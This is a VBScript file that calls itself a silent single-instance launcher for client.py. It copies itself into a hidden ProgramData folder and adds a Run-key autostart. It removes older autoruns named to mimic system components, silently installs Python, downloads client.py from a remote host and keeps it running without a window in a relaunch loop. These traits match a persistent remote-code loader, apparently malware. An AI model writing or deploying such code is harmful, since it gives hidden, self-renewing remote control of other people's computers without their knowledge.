' ============================================================================
' CLIENT.PY SINGLE-INSTANCE SILENT LAUNCHER - IMPROVED VERSION
' ============================================================================
' This VBS script ensures only one instance of client.py runs at a time
' It launches silently without any visible windows
' ============================================================================

Option Explicit
Dim sh, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim arch: arch = LCase(sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%"))
Const EXPECTED_MD5 = "c6718a72d4727d01f3d4727c2690ab5e"
Dim scriptDir: scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
Dim safeDir: safeDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\SystemCache"
If Not fso.FolderExists(safeDir) Then
  fso.CreateFolder(safeDir)
  On Error Resume Next
  fso.GetFolder(safeDir).Attributes = fso.GetFolder(safeDir).Attributes Or 2
  On Error GoTo 0
End If
Dim logDir: logDir = sh.ExpandEnvironmentStrings("%TEMP%") & "\ClientLauncher"
If Not fso.FolderExists(logDir) Then fso.CreateFolder(logDir)
Dim logPath: logPath = logDir & "\launcher.log"
Sub EnsureSafeLauncher()
  On Error Resume Next
  Dim dest
  dest = safeDir & "\ClientService.vbs"
  fso.CopyFile WScript.ScriptFullName, dest, True
  fso.GetFile(dest).Attributes = fso.GetFile(dest).Attributes Or 2
End Sub

Sub EnsureClientInSafe()
  On Error Resume Next
  Dim src, dest
  src = scriptDir & "\client.py"
  dest = safeDir & "\client.py"
  If fso.FileExists(src) Then
    fso.CopyFile src, dest, True
  End If
End Sub
Sub EnsureAutorun()
  On Error Resume Next
  Dim runKey, cmd, dest
  dest = safeDir & "\ClientService.vbs"
  EnsureSafeLauncher
  EnsureClientInSafe
  runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher"
  cmd = "wscript.exe """ & dest & """"
  sh.RegWrite runKey, cmd, "REG_SZ"
End Sub
EnsureAutorun
Sub RemoveLegacyAutorun()
  On Error Resume Next
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost32"
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate"
End Sub
RemoveLegacyAutorun
Sub Log(s)
  On Error Resume Next
  Dim lf: Set lf = fso.OpenTextFile(logPath, 8, True)
  lf.WriteLine Now & " " & s
  lf.Close
End Sub
Function ExecOut(cmd)
  On Error Resume Next
  Dim tmp, rc, out
  Randomize
  tmp = logDir & "\out_" & Replace(Replace(Replace(CStr(Now), ":", "_"), " ", "_"), "/", "_") & "_" & CStr(Int(Rnd * 1000000)) & ".txt"
  If LCase(Left(cmd, 7)) = "cmd /c " Then
    rc = sh.Run(cmd & " > """ & tmp & """ 2>&1", 0, True)
  Else
    rc = sh.Run("cmd /c " & cmd & " > """ & tmp & """ 2>&1", 0, True)
  End If
  out = ReadText(tmp)
  If fso.FileExists(tmp) Then
    On Error Resume Next
    fso.DeleteFile tmp, True
    On Error GoTo 0
  End If
  ExecOut = out
End Function
Function FindPythonw()
  On Error Resume Next
  Dim out, lines, i, p
  out = ExecOut("cmd /c where pythonw.exe")
  lines = Split(out, vbCrLf)
  For i = 0 To UBound(lines)
    p = Trim(lines(i))
    If p <> "" And fso.FileExists(p) Then FindPythonw = p : Exit Function
  Next
  out = ExecOut("cmd /c where python.exe")
  lines = Split(out, vbCrLf)
  For i = 0 To UBound(lines)
    p = Trim(lines(i))
    If p <> "" Then
      p = Replace(p, "python.exe", "pythonw.exe")
      If fso.FileExists(p) Then FindPythonw = p : Exit Function
    End If
  Next
  p = sh.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python312\pythonw.exe"
  If fso.FileExists(p) Then FindPythonw = p : Exit Function
  FindPythonw = ""
End Function
Function FileMD5(path)
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ MD5")
  Dim lines: lines = Split(out, vbCrLf)
  Dim i, h: h = ""
  For i = 0 To UBound(lines)
    If Len(lines(i)) >= 32 And InStr(lines(i), " ") = 0 Then
      h = Trim(lines(i))
      Exit For
    End If
  Next
  FileMD5 = LCase(h)
End Function
Function ReadText(path)
  On Error Resume Next
  If Not fso.FileExists(path) Then ReadText = "" : Exit Function
  Dim t: t = ""
  Dim f: Set f = fso.OpenTextFile(path, 1, False)
  t = f.ReadAll
  f.Close
  ReadText = t
End Function
Function HttpGet(url)
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", url, False
  xhr.Send
  If xhr.Status = 200 Then
    HttpGet = xhr.responseText
  Else
    HttpGet = ""
  End If
End Function
Function ExtractJsonValue(json, key)
  On Error Resume Next
  Dim k: k = """" & key & """"
  Dim p: p = InStr(1, json, k, vbTextCompare)
  If p = 0 Then ExtractJsonValue = "" : Exit Function
  p = InStr(p, json, ":")
  If p = 0 Then ExtractJsonValue = "" : Exit Function
  p = InStr(p, json, """")
  If p = 0 Then ExtractJsonValue = "" : Exit Function
  Dim q: q = InStr(p + 1, json, """")
  If q = 0 Then ExtractJsonValue = "" : Exit Function
  ExtractJsonValue = Mid(json, p + 1, q - p - 1)
End Function
Function LatestStateJson()
  On Error Resume Next
  Dim base1, base2, j
  base1 = "http://127.0.0.1:8080"
  base2 = "http://localhost:8080"
  j = HttpGet(base1 & "/download/updater/latest.json")
  If j <> "" Then LatestStateJson = j : Exit Function
  j = HttpGet(base2 & "/download/updater/latest.json")
  If j <> "" Then LatestStateJson = j : Exit Function
  LatestStateJson = ""
End Function
Function UpdaterMD5()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim v
  If j <> "" Then
    v = ExtractJsonValue(j, "md5")
  End If
  If v = "" Then
    Dim p: p = scriptDir & "\updates\updater_state.json"
    j = ReadText(p)
    v = ExtractJsonValue(j, "md5")
  End If
  If v = "" Then v = EXPECTED_MD5
  UpdaterMD5 = LCase(v)
End Function
Function UpdaterURL()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim u
  If j <> "" Then
    u = ExtractJsonValue(j, "download_url")
  End If
  If u = "" Then
    Dim p: p = scriptDir & "\updates\updater_state.json"
    j = ReadText(p)
    u = ExtractJsonValue(j, "download_url")
  End If
  If u = "" Then
    u = "https://neural-control-hub.onrender.com/download/updater/client.py"
  End If
  UpdaterURL = u
End Function
Function LatestVersion()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim v
  If j <> "" Then
    v = ExtractJsonValue(j, "version")
  End If
  If v = "" Then
    v = ExtractJsonValue(j, "md5")
  End If
  LatestVersion = v
End Function
Function DownloadToFile(url, path)
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", url, False
  xhr.Send
  If xhr.Status = 200 Then
    Dim stm: Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile path, 2
    stm.Close
    DownloadToFile = True
  Else
    DownloadToFile = False
  End If
End Function
Function IsOnline()
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", "http://www.msftconnecttest.com/connecttest.txt", False
  xhr.Send
  If xhr.Status = 200 Then IsOnline = True : Exit Function
  Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", "https://www.google.com/generate_204", False
  xhr.Send
  If xhr.Status = 204 Or xhr.Status = 200 Then
    IsOnline = True
  Else
    IsOnline = False
  End If
End Function
Function PythonAvailable()
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c py -3 -V")
  If InStr(out, "Python 3") > 0 Then PythonAvailable = True : Exit Function
  out = ExecOut("cmd /c python.exe -V")
  If InStr(out, "Python 3") > 0 Then PythonAvailable = True Else PythonAvailable = False
End Function
Sub EnsurePython()
  If PythonAvailable() Then Exit Sub
  If Not IsOnline() Then
    Log "Offline detected; deferring Python install"
    Exit Sub
  End If
  Dim url, installer
  If InStr(arch, "64") > 0 Then
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
  Else
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
  End If
  installer = logDir & "\python312.exe"
  If Not DownloadToFile(url, installer) Then Log "Python download failed: " & url : Exit Sub
  Dim cmd: cmd = """" & installer & """ /quiet PrependPath=1 Include_test=0"
  sh.Run cmd, 0, True
  If Not PythonAvailable() Then Log "Python install failed"
End Sub
Function FindClientPy()
  Dim pScript: pScript = scriptDir & "\client.py"
  Dim expected: expected = UpdaterMD5()
  Dim url: url = UpdaterURL()
  Dim ver: ver = LatestVersion()
  If ver = "" Then ver = "latest"
  Dim pVer: pVer = safeDir & "\client_" & ver & ".py"
  If fso.FileExists(pVer) Then
    Dim cur: cur = FileMD5(pVer)
    If cur = expected And cur <> "" Then
      FindClientPy = pVer
      Exit Function
    End If
  End If
  If fso.FileExists(pScript) Then
    Dim m: m = FileMD5(pScript)
    If m = expected And m <> "" Then
      On Error Resume Next
      fso.CopyFile pScript, pVer, True
      On Error GoTo 0
      If fso.FileExists(pVer) Then
        Dim md2: md2 = FileMD5(pVer)
        If md2 = expected And md2 <> "" Then
          FindClientPy = pVer
          Exit Function
        End If
      End If
    End If
  End If
  If Not IsOnline() Then
    Log "Offline detected; deferring client.py download"
    FindClientPy = ""
    Exit Function
  End If
  If DownloadToFile(url, pVer) Then
    Dim md: md = FileMD5(pVer)
    If md = expected And md <> "" Then
      CleanOldClients pVer
      FindClientPy = pVer
      Exit Function
    Else
      On Error Resume Next
      fso.DeleteFile pVer, True
      On Error GoTo 0
      Log "MD5 mismatch: " & md
    End If
  Else
    Log "client.py download failed"
  End If
  FindClientPy = ""
End Function
Function IsRunning()
  On Error Resume Next
  Dim svc: Set svc = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
  Dim col: Set col = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
  Dim p, cmd
  For Each p In col
    cmd = LCase(p.CommandLine & "")
    If InStr(cmd, "client_") > 0 Or InStr(cmd, "client.py") > 0 Then
      IsRunning = True
      Exit Function
    End If
  Next
  IsRunning = False
End Function
Sub TerminateExisting()
  On Error Resume Next
  Dim svc: Set svc = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
  Dim col: Set col = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
  Dim p, cmd
  For Each p In col
    cmd = LCase(p.CommandLine & "")
    If InStr(cmd, "client_") > 0 Or InStr(cmd, "client.py") > 0 Then
      p.Terminate()
    End If
  Next
End Sub
Sub CleanOldClients(keepPath)
  On Error Resume Next
  Dim f
  For Each f In fso.GetFolder(safeDir).Files
    Dim nm: nm = LCase(f.Name)
    If Right(nm, 3) = ".py" Then
      If Left(nm, 7) = "client_" And LCase(f.Path) <> LCase(keepPath) Then
        fso.DeleteFile f.Path, True
      End If
      If nm = "client.py" And LCase(f.Path) <> LCase(keepPath) Then
        fso.DeleteFile f.Path, True
      End If
    End If
  Next
End Sub
Sub LaunchClient(scriptPath)
  Dim wd: wd = fso.GetParentFolderName(scriptPath)
  Dim cmd
  On Error Resume Next
  sh.CurrentDirectory = wd
  Dim pyw: pyw = FindPythonw()
  If pyw <> "" Then
    cmd = """" & pyw & """ """ & scriptPath & """"
  ElseIf PythonAvailable() Then
    cmd = "py -3 """ & scriptPath & """"
  Else
    cmd = "python.exe """ & scriptPath & """"
  End If
  sh.Run cmd, 0, False
End Sub
Sub Main()
  EnsurePython()
  Dim cp: cp = FindClientPy()
  If cp = "" Then Log "client.py unavailable" : Exit Sub
  TerminateExisting
  LaunchClient cp : WScript.Sleep 3000
  Do
    If Not IsRunning() Then
      cp = FindClientPy()
      If cp <> "" Then LaunchClient cp
    End If
    WScript.Sleep 10000
  Loop
End Sub
Main
